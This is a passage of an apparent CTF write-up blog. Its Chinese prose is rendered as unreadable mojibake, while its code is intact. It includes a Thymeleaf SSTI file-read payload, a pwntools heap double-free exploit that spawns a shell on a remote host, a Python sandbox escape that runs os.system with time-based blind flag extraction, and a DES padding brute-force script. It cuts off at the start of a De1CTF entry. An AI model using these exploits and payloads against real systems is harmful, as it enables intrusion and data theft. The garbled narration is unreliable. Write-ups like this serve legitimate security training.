vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">var app = <span class="keyword">new</span> Vue(&#123;</span><br><span class="line">    <span class="keyword">e</span><span class="variable">l:</span> <span class="string">'#app'</span>,</span><br><span class="line">    dat<span class="variable">a:</span> &#123;</span><br><span class="line">        conten<span class="variable">t:</span> <span class="string">''</span>,</span><br><span class="line">        resul<span class="variable">t:</span> <span class="string">''</span></span><br><span class="line">    &#125;,</span><br><span class="line">    method<span class="variable">s:</span> &#123;</span><br><span class="line">        reques<span class="variable">t:</span> <span class="function"><span class="keyword">function</span><span class="params">(event)</span> &#123;</span></span><br><span class="line">            var <span class="keyword">vm</span> = this</span><br><span class="line">            axios.post(<span class="string">'/render'</span>, &#123;</span><br><span class="line">                conten<span class="variable">t:</span> <span class="keyword">vm</span>.content</span><br><span class="line">            &#125;)</span><br><span class="line">                .then(<span class="function"><span class="keyword">function</span> <span class="params">(response)</span> &#123;</span></span><br><span class="line">                    console.<span class="built_in">log</span>(response)</span><br><span class="line">                    <span class="keyword">vm</span>.result = response.data.result</span><br><span class="line">                &#125;)</span><br><span class="line">                .<span class="keyword">catch</span>(<span class="function"><span class="keyword">function</span> <span class="params">(error)</span> &#123;</span></span><br><span class="line">                    console.<span class="built_in">log</span>(error)</span><br><span class="line">                    <span class="keyword">vm</span>.result = error</span><br><span class="line">                &#125;)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>å†æ ¹æ®é¢˜ç›®Renderï¼Œåº”è¯¥æ˜¯ä¸ªSSTIæ— ç–‘</p><p>å­¦ä¹ <a href="https://www.k0rz3n.com/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BSSTI%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener">æ–‡ç« </a></p><p>ä½†æ˜¯è¡¨ç¤ºè‡ªå·±å¤ªèœäº†ï¼Œç”šè‡³æ²¡çœ‹å‡ºæ¥è¿™ä¸ªç½‘é¡µçš„æ¡†æ¶</p><p>äºæ˜¯å…ˆå»åšäº†åˆ«çš„é¢˜ã€‚</p><p>ä¹‹åé˜Ÿå‹è¯´ï¼Œæ˜¯springbootï¼Œä»–è¯´è¿›å…¥<a href="http://47.107.244.251:18080/renderå›æ˜¾çš„æ˜¯" target="_blank" rel="noopener">http://47.107.244.251:18080/renderå›æ˜¾çš„æ˜¯</a></p><p><img src="https://i.loli.net/2020/04/30/hgyOsAmMtkcIlWo.png" alt="Render">é‚æŠ“åŒ…ï¼Œå¾—åˆ°</p><p><img src="https://i.loli.net/2020/04/30/nLXKC8eZxu9afbw.png" alt="Render"></p><p>å› ä¸ºSpring Boot å®˜æ–¹æ¨èä½¿ç”¨ â€œThymeleafâ€æ¨¡æ¿å¼•æ“</p><p>äºæ˜¯è¯•è¯•æ˜¯å¦æœ‰Thymeleaf æ¸²æŸ“</p><p><img src="https://i.loli.net/2020/04/30/xb6QnRTlcOXhFqG.png" alt="Render"></p><p>å‘ç°å¤±è´¥ï¼ŒæŠŠæ€è·¯ä¸¢ç»™é˜Ÿå‹ï¼Œè®©ä»–å†å»è¯•è¯•ã€‚</p><p>æœ€åå¾ˆå°´å°¬ï¼Œé˜Ÿå‹è¯´ï¼Œæˆ‘ç¬¦å·ç”¨é”™äº†ï¼Œè¯¥ç”¨å¤§æ‹¬å·ï¼Œï¼ˆå•Šï¼Œä½çº§é”™è¯¯ï¼Œ233333ï¼‰</p><p><img src="https://i.loli.net/2020/04/30/Ug9QuyRI2vSjYfr.png" alt="Render"></p><p>å›æ˜¾æˆåŠŸï¼Œäºæ˜¯javaè¯»æ–‡ä»¶ä¸€æŠŠæ¢­</p><p>payload</p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">"content"</span>:<span class="type"></span>"[[$&#123;<span class="keyword">new</span> <span class="type">java</span>.io.BufferedReader(<span class="keyword">new</span> <span class="type">java</span>.io.FileReader(\<span class="string">"/flag\")).readLine()&#125;]]"</span>&#125;</span><br></pre></td></tr></table></figure><p>å‘åŒ…å¾—åˆ°flag</p><p><img src="https://i.loli.net/2020/04/30/WRrA9LvksInEeTf.png" alt="image-20200430233603887"></p><p>flag{nBz9mertYP@pyyZxx9@nn}</p><h3 id="2019"><a href="#2019" class="headerlink" title="2019"></a>2019</h3><p>é¢˜ç›®æè¿°ï¼šHidden in the history</p><p>ä¸‹è½½å¾—åˆ°å›¾ç‰‡</p><p>æ”¾è¿›Stegsolve.jarï¼Œè°ƒæ•´é€šé“å‘ç°ç«¯å€ª</p><p><img src="https://i.loli.net/2020/04/30/tNLGsorfkJ6TU45.png" alt="2019"></p><p>LSBéšå†™ï¼Œ</p><p>ç„¶åæ”¾è¿›zstegï¼Œå¯¼å‡ºå¾—åˆ°å­—ç¬¦ä¸²</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="attribute">QW8obWdIW11XTyxyOFVTM0dNMlIySSVZQjdzdA</span>==</span><br></pre></td></tr></table></figure><p>å»æ‰æ‹¬å·base64å¾—åˆ°:</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">Ao</span>(mgH[]<span class="symbol">WO</span>,r8US3GM2R2I<span class="comment">%YB7st</span></span><br></pre></td></tr></table></figure><p>ç„¶åçœ‹ä¸å‡ºç‰¹å¾ï¼Œäºæ˜¯å…ˆbaseå…¨å®¶æ¡¶è¯•äº†ä¸€æ³¢ï¼Œå‘ç°æ˜¯base85</p><p>è§£å¾—ï¼šflag{~h!%3W-9jKB6(fG}</p><h3 id="Hub"><a href="#Hub" class="headerlink" title="Hub"></a>Hub</h3><p>é¢˜ç›®æè¿°ï¼štip:é¢˜ç›®ç¯å¢ƒä¸ºUbuntu18.04ï¼Œflagè·¯å¾„/home/flag</p><p>è¿™ä¸ªé¢˜å¯ä»¥åˆ©ç”¨å †ä¸Šçš„ç›¸å¯¹åç§»ç„¶åé€šè¿‡deleteæ¥double freeï¼Œä¸”2.27ç‰ˆæœ¬libcå› ä¸ºæœ‰tacaheæœºåˆ¶ï¼Œæ‰€ä»¥doublefreeçš„åˆ©ç”¨å˜å¾—éå¸¸ç®€å•ï¼Œå…ˆå¡«æ»¡7ä¸ªchunkï¼Œå†freeä¸€ä¸ªåˆ°unsortedbiné‡Œé¢å»ï¼Œåˆ©ç”¨é‡Œé¢main_areançš„åœ°å€æ”¹å†™åé¢2ä¸ªå­—èŠ‚ï¼Œçˆ†ç ´ä¸€ä¸‹å¯ä»¥å¾—åˆ°free_hookä¸­çš„chunkï¼Œé€šè¿‡æ”¹å†™free_hookä¸ºputsçš„pltè¡¨ï¼Œç„¶åé€šè¿‡deleteå‡½æ•°æ‰¾åˆ°å¯¹åº”å¯ä»¥æ³„éœ²libcçš„åœ°å€çš„åç§»ï¼Œç„¶åå°±å¯ä»¥æ‰“å°å‡ºlibcçš„åœ°å€ï¼Œå†æ”¹å†™free_hookä¸ºsystemå‡½æ•°åœ°å€ï¼Œå†é€šè¿‡libcä¸Š/bin/shå­—ç¬¦ä¸²çš„åç§»ï¼ŒæˆåŠŸæ‰§è¡Œsystem(â€œ/bin/shâ€)ï¼Œgetshellã€‚è„šæœ¬å¦‚ä¸‹</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#-*- coding:UTF-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">from</span> pwn import *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'split'</span>, <span class="string">'-h'</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process('./hub')</span></span><br><span class="line">p = remote(<span class="string">'47.112.139.218'</span>, <span class="number">13132</span>)</span><br><span class="line">elf = ELF(<span class="string">'./hub'</span>)</span><br><span class="line"></span><br><span class="line">def choose(choice):</span><br><span class="line">    p.recvuntil(<span class="string">'&gt;&gt;'</span>)</span><br><span class="line">    p.sendline(str(choice) + <span class="string">'\x00'</span>)</span><br><span class="line"></span><br><span class="line">def <span class="built_in">add</span>(size):</span><br><span class="line">    choose(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'How long will you stay?\n'</span>)</span><br><span class="line">    p.sendline(str(size) + <span class="string">'\x00'</span>)</span><br><span class="line"></span><br><span class="line">def <span class="built_in">delete</span>(index):</span><br><span class="line">    choose(<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Which hub don\'t you want?\n'</span>)</span><br><span class="line">    p.sendline(str(index) + <span class="string">'\x00'</span>)</span><br><span class="line"></span><br><span class="line">def edit(content):</span><br><span class="line">    choose(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'What do you want?\n'</span>)</span><br><span class="line">    p.<span class="built_in">send</span>(content)</span><br><span class="line"></span><br><span class="line"><span class="built_in">add</span>(<span class="number">0xf0</span>)</span><br><span class="line"><span class="built_in">add</span>(<span class="number">0xf0</span>)</span><br><span class="line"><span class="built_in">add</span>(<span class="number">0xf0</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">delete</span>(<span class="number">-0x200</span>)</span><br><span class="line"><span class="built_in">delete</span>(<span class="number">-0x200</span>)</span><br><span class="line"><span class="built_in">delete</span>(<span class="number">-0x200</span>)</span><br><span class="line"><span class="built_in">delete</span>(<span class="number">-0x200</span>)</span><br><span class="line"><span class="built_in">delete</span>(<span class="number">-0x200</span>)</span><br><span class="line"><span class="built_in">delete</span>(<span class="number">-0x200</span>)</span><br><span class="line"><span class="built_in">delete</span>(<span class="number">-0x200</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">delete</span>(<span class="number">-0x200</span>)</span><br><span class="line"><span class="built_in">add</span>(<span class="number">0xe0</span>)</span><br><span class="line">edit(<span class="string">'\xe8\x68'</span>)</span><br><span class="line"><span class="built_in">add</span>(<span class="number">0xf0</span>)</span><br><span class="line"><span class="built_in">add</span>(<span class="number">0xf0</span>)</span><br><span class="line">edit(p64(elf.plt[<span class="string">'puts'</span>]))</span><br><span class="line"><span class="built_in">delete</span>(<span class="number">-0x1ee0</span>)</span><br><span class="line">libcbase = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>)) - <span class="number">0x3eba83</span></span><br><span class="line"><span class="built_in">log</span>.info(<span class="string">"libcbase:%#x"</span> %libcbase)</span><br><span class="line">system_addr = libcbase + <span class="number">0x4f440</span></span><br><span class="line">edit(p64(system_addr))</span><br><span class="line"><span class="built_in">delete</span>(<span class="number">-0x239a4e</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/04/30/ZfXlDQmhzRCW4vF.png" alt="Hub"></p><h3 id="8v"><a href="#8v" class="headerlink" title="8v"></a>8v</h3><p>é¢˜ç›®æè¿°ï¼šI run the js code and get flag</p><p>å¾—åˆ°ä¸€ä»½æ–‡æ¡£ï¼Œå…¨æ˜¯å­—èŠ‚ç ï¼Œé‚å¼€å§‹ä¸€è¡Œä¸€è¡Œâ€œç¿»è¯‘â€</p><p>å‚è€ƒæ–‡ç« </p><p><a href="https://github.com/v8/v8/blob/master/src/interpreter/interpreter-generator.cc" target="_blank" rel="noopener">https://github.com/v8/v8/blob/master/src/interpreter/interpreter-generator.cc</a></p><p><a href="https://github.com/v8/v8/blob/master/src/interpreter/bytecodes.h" target="_blank" rel="noopener">https://github.com/v8/v8/blob/master/src/interpreter/bytecodes.h</a></p><p><a href="https://zhuanlan.zhihu.com/p/28590489" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/28590489</a></p><p><a href="https://github.com/danbev/learning-v8" target="_blank" rel="noopener">https://github.com/danbev/learning-v8</a></p><p>çœ‹æ‡‚å®ŒæŒ‡ä»¤å¹¶ä¸æ˜¯å¾ˆéš¾ï¼Œæ ¸å¿ƒå°±æ˜¯ä¸€ä¸ªç®€å•çš„ä¸‰é¡¹æ•°å¼‚æˆ–åŠ å¯†ï¼Œ</p><p>ç„¶åå­˜åœ¨ä¸¤ä¸ªç±»ä¼¼äºæ–æ³¢é‚£å¥‘æ•°åˆ—çš„å‰åç›¸å…³çš„æ•°åˆ—ï¼Œ</p><p>æ•°åˆ—aèµ·å§‹ä½æ˜¯$a_1=88$</p><p>å‡½æ•°æ˜¯ï¼š$a_n=(a_{n-1}*65+66)$%$256$</p><p>å¾—åˆ°æ•°åˆ—ï¼š$a = [88, 154, 92, 158, 96, 162, 100, 166, 104, 170, 108, 174, 112, 178, 116, 182, 120, 186, 124, 190, 128, 194, 132, 198, 136, 202, 140, 206, 144, 210,]$</p><p>æ•°åˆ—bèµ·å§‹ä½æ˜¯$b_1=148$</p><p>å‡½æ•°æ˜¯ï¼š$b_n=(b_{n-1}*35-16)$%$256$</p><p>æœ€åç¨‹åºè¿˜æœ‰ä¸ªå°†æ•°åˆ—bé€†åºçš„æ“ä½œ</p><p>å¾—åˆ°æ•°åˆ—ï¼š$b=[236, 212, 204, 116, 172, 20, 140, 180, 108, 84, 76, 244, 44, 148, 12, 52, 236, 212, 204, 116, 172, 20, 140, 180, 108, 84, 76, 244, 44, 148]$</p><p>å†åŠ ä¸Š</p><p>enc=bâ€™\xd2â€\xf1\x8d\xb7\xe0\xd0MF\x87T?\x1fI\x1c\xe7\xcb\x07\xc3\x95z\xb3z\x0b\xbb\xdb\xa1I\xc5;â€™</p><p>æœ€åä¸‰ä¸ªæ•°åˆ—é€ä½å¼‚æˆ–ï¼Œå¾—åˆ°</p><p>flag{V8_ByteCode_is_Very_Easy}</p><h3 id="PyBox"><a href="#PyBox" class="headerlink" title="PyBox"></a>PyBox</h3><p>é¢˜ç›®æè¿°ï¼šcut flag sleep repeat</p><p>è¿ä¸Šæ²™ç®±</p><p><img src="https://i.loli.net/2020/04/30/vdUtPfwu4DlzCy3.png" alt="PyBox"></p><p>çœ‹ç€åƒpythonï¼Œä½†æ˜¯è¿™ä¸ªpythonä¸ºå•¥æ²¡æœ‰ä¸€ç‚¹ç‚¹åŠŸèƒ½ï¼Ÿå•¥ä¹Ÿä¸èƒ½å¹²ï¼Ÿä¹Ÿæ²¡æœ‰å›æ˜¾ã€‚</p><p>ä¸è¿‡æ²¡æœ‰å›æ˜¾å€’å¯ä»¥åˆ©ç”¨sqlçš„æ—¶é—´ç›²æ³¨çš„æ–¹æ³•ï¼Œä½†æ˜¯æœ‰å•¥åŠŸèƒ½èƒ½åˆ©ç”¨å‘¢ï¼Ÿ</p><p>äºæ˜¯å»å­¦ä¹ æ²™ç®±é€ƒé€¸ä¸€æ³¢</p><p><a href="https://bestwing.me/awesome-python-sandbox-in-ciscn.html" target="_blank" rel="noopener">https://bestwing.me/awesome-python-sandbox-in-ciscn.html</a></p><p><img src="https://i.loli.net/2020/04/30/MuHaAbo7zpVqLXe.png" alt="PyBox"></p><p>å‘ç°äº†è¿™ä¸ªï¼Œ</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">__import__</span><span class="selector-class">.__getattribute__</span>(<span class="string">'__clo'</span>+<span class="string">'sure__'</span>)<span class="selector-attr">[0]</span><span class="selector-class">.cell_contents</span>(<span class="string">'o'</span>+<span class="string">'s'</span>)<span class="selector-class">.__getattribute__</span>(<span class="string">'sy'</span>+<span class="string">'stem'</span>)(<span class="string">'l'</span>+<span class="string">'s home'</span>)</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/04/30/MUOSVZzu9Qqt4fX.png" alt="PyBoxV"></p><p>æ²¡æœ‰æŠ¥é”™ï¼Œ</p><p>ä½†æ˜¯è¿™é‡Œæ²¡æœ‰å›æ˜¾å‘ƒï¼Œäºæ˜¯ï¼Œæ—¶é—´ç›²æ³¨ç»“åˆclosureï¼Œ</p><p>å†æ ¹æ®è¿™ç¯‡æ–‡ç« <a href="https://blog.csdn.net/caoshunxin01/article/details/79355566" target="_blank" rel="noopener">https://blog.csdn.net/caoshunxin01/article/details/79355566</a></p><p>åˆ©ç”¨cut - c é€ä½çˆ†ç ´</p><p>payload:</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">__import__</span><span class="selector-class">.__getattribute__</span>(<span class="string">'__clo'</span>+<span class="string">'sure__'</span>)<span class="selector-attr">[0]</span><span class="selector-class">.cell_contents</span>(<span class="string">'o'</span>+<span class="string">'s'</span>)<span class="selector-class">.__getattribute__</span>(<span class="string">'sy'</span>+<span class="string">'stem'</span>)(<span class="string">'flag_p=`cut -c 1 /home/flag`; [ $flag_p = \"f\" ] &amp;&amp; sleep 2'</span></span><br></pre></td></tr></table></figure><p>exp:</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">from pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> <span class="built_in">time</span></span><br><span class="line"></span><br><span class="line">sh=remote(<span class="string">"47.112.108.17"</span>,<span class="number">12312</span>)</span><br><span class="line">sh.recvuntil(<span class="string">"&gt;&gt;&gt;"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ans = <span class="string">"__import__.__getattribute__('__clo'+'sure__')[0].cell_contents('o'+'s').__getattribute__('sy'+'stem')('a=`cut -c 1 /home/flag`; [ $a = \"</span>f\<span class="string">" ] &amp;&amp; sleep 1'"</span></span><br><span class="line">t = <span class="built_in">time</span>.<span class="built_in">time</span>()</span><br><span class="line">sh.sendline(ans)</span><br><span class="line">sh.recvuntil(<span class="string">"&gt;&gt;&gt;"</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">time</span>.<span class="built_in">time</span>()-t &gt; <span class="number">0.5</span> :</span><br><span class="line">print(<span class="string">"get!"</span>)</span><br><span class="line">break</span><br></pre></td></tr></table></figure><p>å¾—åˆ°å›æ˜¾</p><p><img src="https://i.loli.net/2020/04/30/UkcE5Dw72Roafty.png" alt="PyBox"></p><p>åˆ©ç”¨æˆåŠŸã€‚å†åŠ ä¸¤ä¸ªå¾ªç¯ï¼Œå°±å¥½äº†ã€‚</p><p>å¾—åˆ°ç»“æœ</p><p><img src="https://i.loli.net/2020/04/30/AHvZk86rQUMOYh3.png" alt="PyBox"></p><p>ä¸çŸ¥é“æ˜¯ä¸æ˜¯åæ¥æ”¹flagäº†ï¼Œä¹‹å‰è·‘è„šæœ¬å¾—åˆ°çš„æ˜¯</p><p>flag{Pyt5on_S4ndB0x+4pParmOr_S4ndb0x}</p><p>å†™wpå¤ç°çš„æ—¶å€™å¾—åˆ°çš„æ˜¯</p><p>flag{Pyt5on_S4ndB0x+4pParmOr_S4ndb0x_sorry}  </p><p>hhhh?</p><h3 id="Babycry"><a href="#Babycry" class="headerlink" title="Babycry"></a>Babycry</h3><p>nc è¿‡å»å¾—åˆ°åŠ å¯†è§„åˆ™</p><p><img src="https://i.loli.net/2020/04/30/VQmAefY47rS928R.png" alt="Babycry"></p><p>å†™wpçš„æ—¶å€™ç¯å¢ƒå…³äº†ï¼Œè¿™é‡Œå°±ç›´æ¥å£è¿°äº†ã€‚</p><p>æ—¢ç„¶åŠ å¯†è§„åˆ™æ˜¯desï¼ˆkey,sth..flag{*}paddingï¼‰</p><p>åŠ ä¸Šhint</p><p>æ‰€ä»¥æˆ‘ä»¬æ§åˆ¶è¾“å…¥ï¼Œå¯ä»¥ä½¿å¾—è¢«åŠ å¯†çš„å­—ç¬¦æœ«å°¾ä¸º</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#125;_______ï¼ˆ<span class="number">7</span>ä¸ª<span class="keyword">_</span>ï¼‰</span><br></pre></td></tr></table></figure><p>é¦–å…ˆæˆ‘ä»¬å…ˆè¾“å…¥</p><p>des a</p><p>des aa</p><p>des aaa</p><p>ç›´åˆ°æ‹¼æ¥åçš„å­—ç¬¦ä¸²é•¿åº¦ä¸º8çš„å€æ•°ï¼Œ</p><p>å°è±¡é‡Œåº”è¯¥æ˜¯ä¸¤ä¸ªaçš„æ—¶å€™ï¼Œå°±å¥½äº†ã€‚</p><p>ç„¶åæˆ‘ä»¬å½“è¾“å…¥ä¸‰ä¸ªaçš„æ—¶å€™ï¼Œå­—ç¬¦ä¸²åº”è¯¥å°±æ˜¯aaaflag{*}å†åŠ ä¸Šä¸ƒä¸ª_ï¼Œé‚£ä¹ˆæœ«å°¾å°±åº”è¯¥æ˜¯ä¸€ä¸ª}åŠ ä¸ƒä¸ª_ç»„æˆçš„ï¼Œ</p><p>å¯†æ–‡æœ«å°¾çš„8ä¸ªå­—èŠ‚ï¼Œå°±æ˜¯è¿™ä¸€ä¸ª}åŠ ä¸ƒä¸ª_å­—ç¬¦æ‰€ç»„æˆçš„å…«ä¸ªå­—ç¬¦çš„å¯†æ–‡</p><p>æˆ‘ä»¬å¯ä»¥è¾“å…¥</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#125;_______ï¼ˆ<span class="number">7</span>ä¸ª<span class="keyword">_</span>ï¼‰</span><br></pre></td></tr></table></figure><p>çœ‹è¿”å›çš„å¯†æ–‡çš„å‰8ä¸ªå­—èŠ‚åŠ ä¸€éªŒè¯ã€‚</p><p>äºæ˜¯æ€è·¯å°±æ˜¯ï¼Œæ§åˆ¶paddingï¼Œé€ä½çˆ†ç ´ï¼Œ</p><p>è¾“å…¥aaaaï¼Œè¿”å›å¯†æ–‡çš„å8å­—èŠ‚å°±æ˜¯æ˜æ–‡    </p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?&#125;______ï¼ˆ<span class="number">6</span>ä¸ª<span class="literal">_</span>ï¼‰<span class="meta">#?ä»£è¡¨flagæœ€åä¸€ä½å­—ç¬¦</span></span><br></pre></td></tr></table></figure><p>çš„å¯†æ–‡</p><p>ç„¶åæˆ‘ä»¬åœ¨çˆ†ç ´è¿™ä¸€ä½ï¼Œç›´åˆ°è¿”å›å¯†æ–‡çš„å‰å…«ä¸ªå­—èŠ‚ä¸è¾“å…¥aaaaè¿”å›çš„å¯†æ–‡çš„æœ€å8å­—èŠ‚ç›¸åŒä½ç½®ï¼Œ</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level =<span class="string">"debug"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">sh</span>=remote(<span class="string">"139.9.222.76"</span>,19999)</span><br><span class="line"><span class="keyword">sh</span>.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="keyword">range</span>(33,126):</span><br><span class="line">    ans = <span class="string">"des "</span>+chr(i)+<span class="string">"&#125;______"</span></span><br><span class="line">    <span class="keyword">sh</span>.sendline(ans)</span><br><span class="line">    p = <span class="keyword">sh</span>.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">"54f6d4254fe2a8d4"</span> <span class="keyword">in</span> p :</span><br><span class="line">        <span class="keyword">print</span>(<span class="string">"get!"</span>)</span><br><span class="line">        <span class="keyword">print</span>(ans)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>å¾—åˆ°ç»“æœ</p><p><img src="https://i.loli.net/2020/04/30/UYbicRHzJ5n2gEu.png" alt="Babycry"></p><p>ç„¶åä»¥æ­¤ç±»æ¨ï¼Œé€ä½çˆ†ç ´ã€‚</p><p>åé¢è¿˜æœ‰ç‚¹åŒºåˆ«å°±æ˜¯ï¼Œçˆ†ç ´å®Œ8ä½ï¼Œç”¨æ¥éªŒè¯çš„å¯†æ–‡ä¸èƒ½å†ä»æœ«å°¾æ‰¾äº†ï¼Œå¾—æ‰¾ä¹‹å‰æ‰¾çš„8ä¸ªå­—èŠ‚å¯†æ–‡çš„å‰8ä¸ªå­—èŠ‚å¯†æ–‡ã€‚</p><p>æ¯”èµ›çš„æ—¶å€™å°±æ˜¯ç”¨è¿™ä¸ªåŠè‡ªåŠ¨åŒ–è„šæœ¬æ‰‹æ’¸çš„ï¼Œ</p><p>åŸæœ¬æƒ³åœ¨å†™wpçš„æ—¶å€™å†™ä¸ªå…¨è‡ªåŠ¨åŒ–çš„ï¼Œå¥ˆä½•ç¯å¢ƒå…³äº†ï¼Œæ²¡æ³•æµ‹è¯•ã€‚é‚æ”¾å¼ƒã€‚</p>]]></content>
      
      
      <categories>
          
          <category> æ¯”èµ›å°å±‹ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Write Up </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2019 De1CTF</title>
      <link href="/2019/08/03/2019De1CTF/"/>
      <url>/2019/08/03/2019De1CTF/</url>
      
        <content type="html"><![CDATA[<h3 id="SSRF-ME"><a href="#SSRF-ME" class="headerlink" title="SSRF ME"></a>SSRF ME</h3><p>hintï¼šflag is in ./flag.txt</p><p>è®¿é—®é¶æœºï¼Œæ‹¿åˆ°é¢˜ç›®æºç </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span 